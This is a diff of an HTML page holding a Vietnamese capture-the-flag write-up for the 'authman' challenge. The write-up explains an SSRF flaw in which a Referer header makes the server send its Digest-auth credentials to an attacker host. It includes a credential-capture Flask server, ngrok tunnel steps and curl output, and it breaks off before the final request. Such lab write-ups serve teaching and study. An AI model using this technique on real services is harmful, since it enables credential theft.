@@ -27,6 +27,25 @@ Cấu trúc file challenge
 
 authman/app/__init__.py – khởi tạo Flask app, cấu hình, HTTPDigestAuth
 
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+
+
 from flask import Flask
 from flask_bootstrap import Bootstrap5
 from flask_httpauth import HTTPDigestAuth
@@ -44,10 +63,12 @@ def get_pw(uname):
 from app import routes
 
 
+
+
 authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/writeup_-authman-buckeye-2025/">
-<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.cd7d779f43ba7341369cf5885000729d0346866d1e68e53eaa9502915f945caa.css" integrity="sha256-zX13n0O6c0E2nPWIUABynQNGhm0eaOU&#43;qpUCkV&#43;UXKo=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.c85d014ccab6242e17ca522adf6f47099d53d21ed8842ec884f11d5fe103d061.css" integrity="sha256-yF0BTMq2JC4XylIq329HCZ1T0h7YhC7IhPEdX&#43;ED0GE=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
@@ -134,22 +155,43 @@ authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 <ul>
 <li><code>authman/app/__init__.py</code> – khởi tạo Flask app, cấu hình, HTTPDigestAuth</li>
 </ul>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask
-from flask_bootstrap import Bootstrap5
-from flask_httpauth import HTTPDigestAuth
-from config import FlaskConfig
-
-app = Flask(__name__)
-app.config.from_object(FlaskConfig)
-bootstrap = Bootstrap5(app)
-
-auth = HTTPDigestAuth()
-@auth.get_password
-def get_pw(uname):
-	return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
-
-from app import routes
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask
+</span></span><span class="line"><span class="cl">from flask_bootstrap import Bootstrap5
+</span></span><span class="line"><span class="cl">from flask_httpauth import HTTPDigestAuth
+</span></span><span class="line"><span class="cl">from config import FlaskConfig
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">app.config.from_object(FlaskConfig)
+</span></span><span class="line"><span class="cl">bootstrap = Bootstrap5(app)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">auth = HTTPDigestAuth()
+</span></span><span class="line"><span class="cl">@auth.get_password
+</span></span><span class="line"><span class="cl">def get_pw(uname):
+</span></span><span class="line"><span class="cl">	return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from app import routes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>
 <p><code>authman/app/routes.py</code> – định nghĩa các route <code>/</code>, <code>/auth</code>, <code>/api/check</code></p>
 </li>
@@ -169,17 +211,33 @@ from app import routes
 <hr>
 <h2 id="phân-tích-sâu">Phân tích sâu<a hidden class="anchor" aria-hidden="true" href="#phân-tích-sâu">#</a></h2>
 <p><code>config.py</code></p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">from secrets import token_urlsafe, token_hex
-import os
-
-class FlaskConfig:
-    SECRET_KEY = token_hex(32)
-    AUTH_USERS = {
-        &#34;keno&#34;: token_urlsafe(16),
-        &#34;tenk&#34;: token_urlsafe(16)
-    }
-    FLAG = os.environ.get(&#39;FLAG&#39;,&#39;bctf{fake_flag_for_testing}&#39;)
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from secrets import token_urlsafe, token_hex
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class FlaskConfig:
+</span></span><span class="line"><span class="cl">    SECRET_KEY = token_hex(32)
+</span></span><span class="line"><span class="cl">    AUTH_USERS = {
+</span></span><span class="line"><span class="cl">        &#34;keno&#34;: token_urlsafe(16),
+</span></span><span class="line"><span class="cl">        &#34;tenk&#34;: token_urlsafe(16)
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    FLAG = os.environ.get(&#39;FLAG&#39;,&#39;bctf{fake_flag_for_testing}&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>
 <p><code>SECRET_KEY</code> -&gt; random mỗi lần container start.</p>
 </li>
@@ -197,60 +255,140 @@ class FlaskConfig:
 </ul>
 <p>=&gt; password không cố định, không brute-force được</p>
 <p><code>app/__init__.py</code> Khởi tạo app và thiết lập Digest authentication</p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask
-from flask_bootstrap import Bootstrap5
-from flask_httpauth import HTTPDigestAuth
-from config import FlaskConfig
-
-app = Flask(__name__)
-app.config.from_object(FlaskConfig)
-bootstrap = Bootstrap5(app)
-
-auth = HTTPDigestAuth()
-@auth.get_password
-def get_pw(uname):
-    return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
-
-from app import routes
-</code></pre><p><code>HTTPDigestAuth</code> được cấu hình với callback để lấy mật khẩu từ <code>AUTH_USERS</code>. <code>Flask-HTTPAuth</code> sử dụng <code>session Flask</code> (cookie) để lưu <code>nonce</code> và <code>opaque</code>, làm cho auth trở thành stateful. Điều này yêu cầu bao gồm <code>session cookie</code> đúng khi replay để xác thực <code>nonce</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask
+</span></span><span class="line"><span class="cl">from flask_bootstrap import Bootstrap5
+</span></span><span class="line"><span class="cl">from flask_httpauth import HTTPDigestAuth
+</span></span><span class="line"><span class="cl">from config import FlaskConfig
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">app.config.from_object(FlaskConfig)
+</span></span><span class="line"><span class="cl">bootstrap = Bootstrap5(app)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">auth = HTTPDigestAuth()
+</span></span><span class="line"><span class="cl">@auth.get_password
+</span></span><span class="line"><span class="cl">def get_pw(uname):
+</span></span><span class="line"><span class="cl">    return app.config[&#39;AUTH_USERS&#39;].get(uname,None)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from app import routes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>HTTPDigestAuth</code> được cấu hình với callback để lấy mật khẩu từ <code>AUTH_USERS</code>. <code>Flask-HTTPAuth</code> sử dụng <code>session Flask</code> (cookie) để lưu <code>nonce</code> và <code>opaque</code>, làm cho auth trở thành stateful. Điều này yêu cầu bao gồm <code>session cookie</code> đúng khi replay để xác thực <code>nonce</code></p>
 <p><code>routes.py</code> <strong>Có 3 endpoint</strong></p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/&#39;,methods=[&#39;GET&#39;])
-def index():
-    return render_template(&#34;index.html&#34;)
-</code></pre><p><code>/</code> trả về <code>index.html</code>, trang home</p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/auth&#39;,methods=[&#39;GET&#39;])
-@auth.login_required
-def auth():
-    return render_template(&#34;auth.html&#34;,flag=app.config[&#39;FLAG&#39;])
-</code></pre><p><code>/auth</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@app.route(&#39;/&#39;,methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def index():
+</span></span><span class="line"><span class="cl">    return render_template(&#34;index.html&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/</code> trả về <code>index.html</code>, trang home</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@app.route(&#39;/auth&#39;,methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">@auth.login_required
+</span></span><span class="line"><span class="cl">def auth():
+</span></span><span class="line"><span class="cl">    return render_template(&#34;auth.html&#34;,flag=app.config[&#39;FLAG&#39;])
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/auth</code></p>
 <ul>
 <li>Được bảo vệ bởi <code>@auth.login_required</code></li>
 <li>Nếu auth thành công, render <code>render.html</code> và truyền biến flag=&hellip;..</li>
 </ul>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">@app.route(&#39;/api/check&#39;,methods=[&#39;GET&#39;])
-def check():
-    (user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
-    res = requests.get(r.referrer + &#39;/auth&#39;,
-        auth = HTTPDigestAuth(user,pw),
-        timeout=3
-    )
-    return jsonify({&#39;status&#39;:res.status_code})
-</code></pre><p><code>/api/check</code></p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">(user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@app.route(&#39;/api/check&#39;,methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def check():
+</span></span><span class="line"><span class="cl">    (user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
+</span></span><span class="line"><span class="cl">    res = requests.get(r.referrer + &#39;/auth&#39;,
+</span></span><span class="line"><span class="cl">        auth = HTTPDigestAuth(user,pw),
+</span></span><span class="line"><span class="cl">        timeout=3
+</span></span><span class="line"><span class="cl">    )
+</span></span><span class="line"><span class="cl">    return jsonify({&#39;status&#39;:res.status_code})
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/api/check</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(user, pw), *_ = app.config[&#39;AUTH_USERS&#39;].items()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li><code>AUTH_USERS</code> là dict:</li>
 </ul>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">{&#34;keno&#34;: &lt;pw_ngẫu_nhiên&gt;, &#34;tenk&#34;: &lt;pw_ngẫu_nhiên&gt;}
-</code></pre><p><code>.items()</code> → list <code>[(user, pw), ...]</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;keno&#34;: &lt;pw_ngẫu_nhiên&gt;, &#34;tenk&#34;: &lt;pw_ngẫu_nhiên&gt;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>.items()</code> → list <code>[(user, pw), ...]</code></p>
 <p><code>(user, pw), *_ = ...</code> → lấy entry đầu tiên trong dict, tức là thường sẽ là <code>(&quot;keno&quot;, &lt;password_của_keno&gt;)</code></p>
 <p>Sau đó:</p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">res = requests.get(
-    r.referrer + &#39;/auth&#39;,
-    auth = HTTPDigestAuth(user,pw),
-    timeout=3
-)
-return jsonify({&#39;status&#39;:res.status_code})
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">res = requests.get(
+</span></span><span class="line"><span class="cl">    r.referrer + &#39;/auth&#39;,
+</span></span><span class="line"><span class="cl">    auth = HTTPDigestAuth(user,pw),
+</span></span><span class="line"><span class="cl">    timeout=3
+</span></span><span class="line"><span class="cl">)
+</span></span><span class="line"><span class="cl">return jsonify({&#39;status&#39;:res.status_code})
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>
 <p>Lấy <code>r.referrer</code> (header <code>Referer</code> do client gửi lên)</p>
 </li>
@@ -264,10 +402,19 @@ return jsonify({&#39;status&#39;:res.status_code})
 <p>=&gt; <code>/api/check</code> là một “health-check API” kiểu: từ server, thử gọi đến <code>/auth</code> bằng <code>credentials</code> thật, nếu <code>status 200</code> → auth server đang chạy OK</p>
 <p><code>auth.html</code>
 Phần quan trọng:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">gg</span> <span style="color:#f92672">=</span> {{ <span style="color:#a6e22e">flag</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">tojson</span> }};
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">typingSpan</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gg</span>;
-</span></span></code></pre></div><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">gg</span> <span class="o">=</span> <span class="p">{{</span> <span class="nx">flag</span> <span class="o">|</span> <span class="nx">tojson</span> <span class="p">}};</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">typingSpan</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">gg</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>Khi auth thành công, template nhận biến flag từ backend và hiển thị nó lên màn hình với hiệu ứng gõ chữ</li>
 </ul>
 <hr>
@@ -285,10 +432,19 @@ Phần quan trọng:</p>
 </ol>
 <hr>
 <h2 id="attack-vector">Attack Vector<a hidden class="anchor" aria-hidden="true" href="#attack-vector">#</a></h2>
-<pre tabindex="0"><code>[Attacker] → [Victim Server] → [Attacker-Controlled Server]
-                ↓
-        (sends credentials)
-</code></pre><p><strong>Attack flow:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Attacker] → [Victim Server] → [Attacker-Controlled Server]
+</span></span><span class="line"><span class="cl">                ↓
+</span></span><span class="line"><span class="cl">        (sends credentials)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Attack flow:</strong></p>
 <ul>
 <li>Attacker gửi request GET tới <code>/api/check</code> kèm malicious <code>Referer</code> header</li>
 <li>Victim server đọc giá trị header <code>Referer</code></li>
@@ -301,42 +457,83 @@ Phần quan trọng:</p>
 <h3 id="step-1-set-up-credential-capture-server">Step 1: Set Up Credential Capture Server<a hidden class="anchor" aria-hidden="true" href="#step-1-set-up-credential-capture-server">#</a></h3>
 <p>Tạo một server Flask đơn giản để log các request đến:
 <code>capture.py</code></p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">from flask import Flask, request
-import base64
-
-app = Flask(__name__)
-
-@app.route(&#39;/auth&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;, &#39;HEAD&#39;])
-def capture():
-    print(&#34;=&#34; * 60)
-    print(&#34;CAPTURED REQUEST:&#34;)
-    print(&#34;=&#34; * 60)
-    print(f&#34;Method: {request.method}&#34;)
-    print(f&#34;Headers:&#34;)
-    for header, value in request.headers:
-        print(f&#34;  {header}: {value}&#34;)
-    
-    # HTTP Digest Auth details will be in Authorization header
-    auth_header = request.headers.get(&#39;Authorization&#39;, &#39;&#39;)
-    if auth_header:
-        print(f&#34;\n🔑 AUTHENTICATION CAPTURED:&#34;)
-        print(f&#34;  {auth_header}&#34;)
-        
-        # Parse digest authentication parameters
-        if &#39;Digest&#39; in auth_header:
-            print(&#34;\n📋 Digest Auth Parameters:&#34;)
-            parts = auth_header.replace(&#39;Digest &#39;, &#39;&#39;).split(&#39;, &#39;)
-            for part in parts:
-                print(f&#34;  {part}&#34;)
-    
-    print(&#34;=&#34; * 60)
-    
-    # Return 401 to trigger authentication
-    return &#39;&#39;, 401, {&#39;WWW-Authenticate&#39;: &#39;Digest realm=&#34;test&#34;&#39;}
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&#39;0.0.0.0&#39;, port=8080, debug=True)
-</code></pre><p>Chạy server bắt credentials</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask, request
+</span></span><span class="line"><span class="cl">import base64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/auth&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;, &#39;HEAD&#39;])
+</span></span><span class="line"><span class="cl">def capture():
+</span></span><span class="line"><span class="cl">    print(&#34;=&#34; * 60)
+</span></span><span class="line"><span class="cl">    print(&#34;CAPTURED REQUEST:&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;=&#34; * 60)
+</span></span><span class="line"><span class="cl">    print(f&#34;Method: {request.method}&#34;)
+</span></span><span class="line"><span class="cl">    print(f&#34;Headers:&#34;)
+</span></span><span class="line"><span class="cl">    for header, value in request.headers:
+</span></span><span class="line"><span class="cl">        print(f&#34;  {header}: {value}&#34;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # HTTP Digest Auth details will be in Authorization header
+</span></span><span class="line"><span class="cl">    auth_header = request.headers.get(&#39;Authorization&#39;, &#39;&#39;)
+</span></span><span class="line"><span class="cl">    if auth_header:
+</span></span><span class="line"><span class="cl">        print(f&#34;\n🔑 AUTHENTICATION CAPTURED:&#34;)
+</span></span><span class="line"><span class="cl">        print(f&#34;  {auth_header}&#34;)
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        # Parse digest authentication parameters
+</span></span><span class="line"><span class="cl">        if &#39;Digest&#39; in auth_header:
+</span></span><span class="line"><span class="cl">            print(&#34;\n📋 Digest Auth Parameters:&#34;)
+</span></span><span class="line"><span class="cl">            parts = auth_header.replace(&#39;Digest &#39;, &#39;&#39;).split(&#39;, &#39;)
+</span></span><span class="line"><span class="cl">            for part in parts:
+</span></span><span class="line"><span class="cl">                print(f&#34;  {part}&#34;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    print(&#34;=&#34; * 60)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # Return 401 to trigger authentication
+</span></span><span class="line"><span class="cl">    return &#39;&#39;, 401, {&#39;WWW-Authenticate&#39;: &#39;Digest realm=&#34;test&#34;&#39;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
+</span></span><span class="line"><span class="cl">    app.run(host=&#39;0.0.0.0&#39;, port=8080, debug=True)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Chạy server bắt credentials</p>
 <hr>
 <h3 id="step-2-exploit-the-ssrf-vulnerability">Step 2: Exploit the SSRF Vulnerability<a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-the-ssrf-vulnerability">#</a></h3>
 <h4 id="sử-dụng-ngrok-không-cần-public-ip-siêu-rcm">Sử dụng ngrok (Không cần public ip) (siêu rcm)<a hidden class="anchor" aria-hidden="true" href="#sử-dụng-ngrok-không-cần-public-ip-siêu-rcm">#</a></h4>
@@ -347,14 +544,32 @@ if __name__ == &#39;__main__&#39;:
 <li>Có dashboard hiển thị chi tiết mọi request</li>
 </ul>
 <h5 id="install-ngrok">Install ngrok<a hidden class="anchor" aria-hidden="true" href="#install-ngrok">#</a></h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   <span style="color:#75715e"># Download from https://ngrok.com/download</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Or via package manager:</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Windows (choco): choco install ngrok</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Mac (brew): brew install ngrok/ngrok/ngrok</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Linux (snap): snap install ngrok</span>
-</span></span></code></pre></div><h5 id="tạo-tunnel-ngrok">Tạo tunnel ngrok<a hidden class="anchor" aria-hidden="true" href="#tạo-tunnel-ngrok">#</a></h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  ngrok http <span style="color:#ae81ff">8080</span>
-</span></span></code></pre></div><p>Response:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">   <span class="c1"># Download from https://ngrok.com/download</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># Or via package manager:</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># Windows (choco): choco install ngrok</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># Mac (brew): brew install ngrok/ngrok/ngrok</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># Linux (snap): snap install ngrok</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="tạo-tunnel-ngrok">Tạo tunnel ngrok<a hidden class="anchor" aria-hidden="true" href="#tạo-tunnel-ngrok">#</a></h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  ngrok http <span class="m">8080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Response:
 <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJVHO_XxWg.png"></p>
 <ul>
 <li>Copy URL ngrok (<code>https://unconsecrative-interaxial-mirtha.ngrok-free.dev</code>)</li>
@@ -363,33 +578,70 @@ if __name__ == &#39;__main__&#39;:
 <hr>
 <h5 id="khai-thác-ssrf">Khai thác SSRF<a hidden class="anchor" aria-hidden="true" href="#khai-thác-ssrf">#</a></h5>
 <p><strong>Truy cập tới <code>/auth</code> để lấy nonce, opaque, session</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>   <span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">v</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost:5000/auth
-</span></span></span></code></pre></div><p>Response:</p>
-<pre tabindex="0"><code class="language-bash!" data-lang="bash!">* Host localhost:5000 was resolved.
-* IPv6: ::1
-* IPv4: 127.0.0.1
-*   Trying [::1]:5000...
-* Connected to localhost (::1) port 5000
-* using HTTP/1.x
-&gt; GET /auth HTTP/1.1
-&gt; Host: localhost:5000
-&gt; User-Agent: curl/8.15.0
-&gt; Accept: */*
-&gt; 
-* Request completely sent off
-&lt; HTTP/1.1 401 UNAUTHORIZED
-&lt; Server: Werkzeug/3.1.3 Python/3.12.12
-&lt; Date: Thu, 13 Nov 2025 15:32:51 GMT
-&lt; Content-Type: text/html; charset=utf-8
-&lt; Content-Length: 19
-&lt; WWW-Authenticate: Digest realm=&#34;Authentication Required&#34;,nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;,opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;,algorithm=&#34;MD5&#34;,qop=&#34;auth&#34;
-&lt; Vary: Cookie
-&lt; Set-Cookie: session=.eJwlyzsOwyAQBcC7bO0C8D5gc5kILw-58keKKyt3jyL3M7e067O-t31zykty7U7UlCy6IS_Ice6pMTBkkJDp8fvRzusfCujdVANGosWyqLNVDKgOK9Hk-wO1QRys.aRX6Iw.gvztvlOTt7zmkbCt-T4scvxsdVA; HttpOnly; Path=/
-&lt; Connection: close
-&lt; 
-* shutting down connection #0
-Unauthorized Access  
-</code></pre><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">   <span class="nx">curl</span> <span class="o">-</span><span class="nx">v</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:5000/auth
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Response:</p>
